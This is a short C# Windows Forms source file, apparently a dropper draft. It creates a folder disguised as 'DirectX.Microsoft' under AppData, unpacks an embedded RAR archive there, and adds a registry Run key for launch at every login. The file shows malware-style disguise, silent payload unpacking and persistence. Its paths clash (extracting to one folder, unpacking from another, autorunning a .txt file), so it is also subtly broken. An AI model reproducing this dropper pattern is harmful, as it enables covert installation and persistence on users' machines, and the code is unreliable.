using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpCompress.Reader;
using System.IO;
using SharpCompress.Common;
using System.Reflection;
using Microsoft.Win32;

namespace WindowsFormsApp5
{
    static class Program
    {



        static void Extract(string Куда_извлекать, string Имя_папки, string Имя_ресурса)
        {
            const string nameSpace = "Extract_file";
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (Имя_папки == "" ? "" : Имя_папки + ".") + Имя_ресурса))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(Куда_извлекать + "\\" + Имя_ресурса, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }


        static void extractor(string path)//разархивирование архива
        {
            using (Stream stream = File.OpenRead(path + @"\FloodFill_Queue.rar"))
            {
                var reader = ReaderFactory.Open(stream);
                while (reader.MoveToNextEntry())
                {
                    if (!reader.Entry.IsDirectory)
                    {

                        reader.WriteEntryToDirectory(path, ExtractOptions.ExtractFullPath | ExtractOptions.Overwrite);
                    }
                }
            }
        }
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\DirectX.Microsoft");//создание папки в appdata/local
            var path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\DirectX.Microsoft";//переменная пути
            Extract("C:\\Users\\narzull\\Desktop\\112233", "file", "FloodFill_Queue.rar");
            extractor(path);

            const string name = "MyTestApplication";
            string ExePath = @"C:\Users\narzull\Desktop\112233\2.txt";
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            reg.SetValue(name, ExePath);


        }
    }
}
